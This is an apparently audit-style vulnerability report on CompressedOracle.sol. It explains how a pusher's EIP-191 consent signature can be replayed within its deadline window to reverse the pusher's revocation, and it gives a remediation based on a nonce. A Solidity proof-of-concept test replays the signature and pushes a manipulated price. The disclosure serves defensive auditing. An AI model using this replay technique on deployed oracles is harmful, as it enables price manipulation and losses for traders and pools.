### Title
Pusher Delegation Signature Replay Within Deadline Window Allows Creator to Nullify Pusher's Revocation - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

### Summary

`allowPushers` in `CompressedOracle.sol` does not invalidate a pusher's previously issued consent signature when the pusher self-revokes via `revokePusher()`. Because the signed hash commits only to `(chainid, address(this), deadline, pusher, creator)` and no on-chain revocation nonce or used-signature bitmap exists, the creator can replay the original signature at any time before the deadline to silently re-establish the delegation the pusher just cancelled. The pusher's only effective remedy is to wait for the deadline to expire.

### Finding Description

`allowPushers` is the EOA-pusher delegation path in `CompressedOracle.sol`. Its replay-resistance design is documented in the NatSpec:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."

The code enforces this with `_ensureDeadline(deadline)` and by including `deadline` in the signed hash:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The deadline prevents replay **after** it expires, but it does not prevent replay **within** the deadline window. When a pusher calls `revokePusher()`, the mapping is cleared:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [2](#0-1) 

But the original signature remains cryptographically valid. The creator can immediately call `allowPushers` again with the same `deadline`, same `pusher`, and same `signature` bytes. `_ensureDeadline` passes (deadline has not expired), the ECDSA recovery succeeds (the hash is identical), and `namespaceRemapping[pusher]` is written back to `msg.sender`. The pusher's revocation is silently undone. [3](#0-2) 

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So any push from the pusher's address after the creator's replay lands in the creator's namespace, not the pusher's own namespace.

### Impact Explanation

If the pusher's private key is compromised after delegation, the pusher calls `revokePusher()` to stop the attacker from writing bad prices into the creator's namespace. The creator, unaware of the compromise or acting in bad faith, replays the old signature to re-establish the delegation. The attacker (holding the compromised pusher key) can now push arbitrary prices directly into the creator's namespace. Those prices are consumed by `AnchoredPriceProvider` or any pool that reads the creator's feeds, resulting in bad-price execution in live swaps — traders receive more output than the oracle curve permits or the pool receives less input than owed.

### Likelihood Explanation

The creator must have retained the original signature bytes (trivially true — they submitted them on-chain and the calldata is public). The deadline must not have expired. Deadlines are caller-chosen and can be set to arbitrarily long windows (e.g., 30 days, 1 year). The replay requires a single transaction from the creator. The pusher has no on-chain mechanism to prevent it other than waiting for the deadline to expire.

### Recommendation

Track consumed signatures with a per-pusher revocation nonce or a `usedSignatures` bitmap. Increment the nonce on every successful `allowPushers` call and include it in the signed hash. When `revokePusher` or `removePushers` is called, increment the nonce so all previously issued signatures for that pusher become invalid:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
keccak256(abi.encode(block.chainid, address(this), deadline, pusherNonce[pusher], pusher, msg.sender))
// After writing namespaceRemapping:
pusherNonce[pusher]++;

// In revokePusher / removePushers:
pusherNonce[msg.sender]++; // or pusherNonce[pusher]++
```

This ensures that any signature issued before a revocation cannot be replayed to re-establish the delegation.

### Proof of Concept

```solidity
// 1. Pusher signs consent with a 30-day deadline
uint256 deadline = block.timestamp + 30 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator establishes delegation
address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegation active

// 3. Pusher self-revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature (deadline still valid)
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs); // succeeds — no revert
assertEq(oracle.namespaceRemapping(pusher), creator); // delegation silently restored

// 5. Any push from the pusher key now lands in creator's namespace
// An attacker holding the compromised pusher key pushes a bad price
vm.prank(pusher); // attacker
(bool ok,) = address(oracle).call(_wordAt(0, 0, _packRaw(9_999_999, 0, 0), uint56(block.timestamp * 1000)));
assertTrue(ok);
// Bad price is now in creator's namespace, readable by pools
assertEq(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, U64x32.decode(9_999_999 >> 16));
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-211)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
